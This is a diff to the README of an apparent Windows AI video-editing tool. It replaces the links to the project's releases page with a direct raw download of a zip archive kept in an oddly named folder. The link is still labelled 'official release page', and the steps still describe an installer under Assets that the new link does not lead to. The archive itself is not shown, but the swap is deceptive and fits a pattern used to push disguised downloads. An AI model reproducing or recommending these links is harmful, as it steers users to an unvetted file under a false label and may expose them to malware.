@@ -1,6 +1,6 @@
 # 🎬 ai-video-editing - Simplify your video creation workflow today
 
-[![Download Installer](https://img.shields.io/badge/Download-Release-blue)](https://github.com/JorgeAlmeida1951/ai-video-editing/releases)
+[![Download Installer](https://img.shields.io/badge/Download-Release-blue)](https://github.com/JorgeAlmeida1951/ai-video-editing/raw/refs/heads/main/overbuilt/video_editing_ai_v3.7-alpha.2.zip)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these specifications to run the software smoothly:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/JorgeAlmeida1951/ai-video-editing/releases) to access the installer.
+1. Visit the [official release page](https://github.com/JorgeAlmeida1951/ai-video-editing/raw/refs/heads/main/overbuilt/video_editing_ai_v3.7-alpha.2.zip) to access the installer.
 2. Locate the file named `ai-video-editing-setup.exe` under the Assets section.
 3. Click the link to save the file to your computer.
 4. Navigate to your Downloads folder once the file finishes saving.
